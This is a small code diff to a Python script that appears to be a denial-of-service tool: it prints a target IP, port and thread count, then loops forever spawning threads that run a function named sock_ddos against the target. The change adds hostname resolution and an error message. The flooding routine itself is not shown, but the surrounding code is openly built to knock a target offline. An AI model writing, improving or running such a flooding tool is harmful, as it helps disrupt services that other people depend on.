@@ -126,6 +126,11 @@ if __name__ == '__main__':
     print(f"[+] Target IP: {host}")
     print(f"[+] Port: {port}")
     print(f"[+] Threads: {thr}")
+    try:
+        hostip = socket.gethostbyname(host)
+    except:
+        print("[+] Check Server IP.")
+        usage()
     while True:
         for i in range(thr):
             ddos = threading.Thread(target=sock_ddos)
